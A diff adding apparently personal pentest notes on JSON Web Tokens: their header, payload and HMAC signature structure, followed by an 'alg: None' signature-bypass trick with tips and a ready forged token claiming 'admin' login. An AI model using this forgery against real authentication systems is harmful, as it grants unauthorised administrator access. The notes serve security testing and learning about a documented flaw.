@@ -1,0 +1,45 @@
+https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+https://tools.ietf.org/html/rfc7519
+
+
+JWTs generally have three parts:
+
+1) header: identifies which algorithm is used to generate the signature
+
+header = '{"alg":"HS256","typ":"JWT"}'
+HS256 indicates that this token is signed using HMAC-SHA256.
+
+
+
+2) payload: contains the claims that we wish to make
+
+payload = '{"loggedInAs":"admin","iat":1422779638}'
+iat, short for "issued at"
+
+
+
+3) signature: calculated by base64url encoding the header and payload and concatenating them with a period (.) as a separator
+
+key = 'secretkey'
+unsignedToken = encodeBase64(header) + '.' + encodeBase64(payload)
+signature = HMAC-SHA256(key, unsignedToken)
+
+
+#) finally the token:
+
+token = encodeBase64(header) + '.' + encodeBase64(payload) + '.' + encodeBase64(signature)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+(*) equals signs get stripped from the token
+(*) it is "None", not "none"
+(*) you can use burp decoder to decode only selected parts
+
+
+{"alg":"None","typ":"JWS"}.{"login":"admin","iat":"1567182333"}.eyJhbGciOiJub25lIiwidHlwIjoiSldTIn0.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTU2NzE4MjMzMyJ9
+
+remove the signature but keep the dot before it. the equals padding can be kept or removed, doesn't matter.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
